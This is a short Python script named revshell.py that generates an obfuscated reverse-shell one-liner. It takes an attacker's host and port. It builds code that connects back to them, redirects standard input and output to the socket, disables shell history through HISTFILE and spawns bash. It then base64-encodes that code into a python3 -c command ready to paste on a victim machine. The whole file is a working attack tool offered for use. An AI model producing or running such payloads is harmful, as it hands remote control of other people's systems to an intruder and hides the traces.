#!/usr/bin/python3

import base64
import sys

if len(sys.argv) != 3:
    print("Usage: revshell.py <LHOST> <LPORT>")
    raise SystemExit

CODE = '''
import os
import pty
import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('{}', {}))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
os.putenv("HISTFILE", '/dev/null')
pty.spawn("/bin/bash")'''.format(sys.argv[1], sys.argv[2])

print("python3 -c \"import base64; exec(compile(base64.b64decode(b'{}'), '<string>', 'exec'))\"".format(str(base64.b64encode(CODE.encode("utf-8"))).split('\'')[1]))
